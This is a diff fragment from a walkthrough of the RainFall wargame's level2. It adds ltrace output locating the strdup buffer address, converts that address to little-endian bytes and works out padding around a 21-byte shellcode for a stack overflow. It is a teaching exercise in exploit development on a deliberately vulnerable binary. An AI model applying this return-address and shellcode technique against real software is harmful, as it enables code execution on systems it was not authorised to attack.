@@ -17,6 +17,22 @@ Program received signal SIGSEGV, Segmentation fault.
 (gdb) x/s $esp
 0xbffff720:      "vvvvwwwwxxxxyyyyzzzz"
 ```
+
+Now to find the return address we will use ltrace on the file:
+```
+level2@RainFall:~$ ltrace ./level2
+__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
+fflush(0xb7fd1a20)                                                                                                                                 = 0
+gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5
+)                                                                                                      = 0xbffff6fc
+puts(""
+)                                                                                                                                           = 1
+strdup("")                                                                                                                                         = 0x0804a008
++++ exited (status 8) +++
+```
+Here we can see that the strdup use the address 0x0804a008 (address from the buffer)
+When transform in little endian and hex: \x08\xa0\x04\x08
+
 26-5=21
 21*4=84
 84-size(shellcode) : 84 - 21= 63
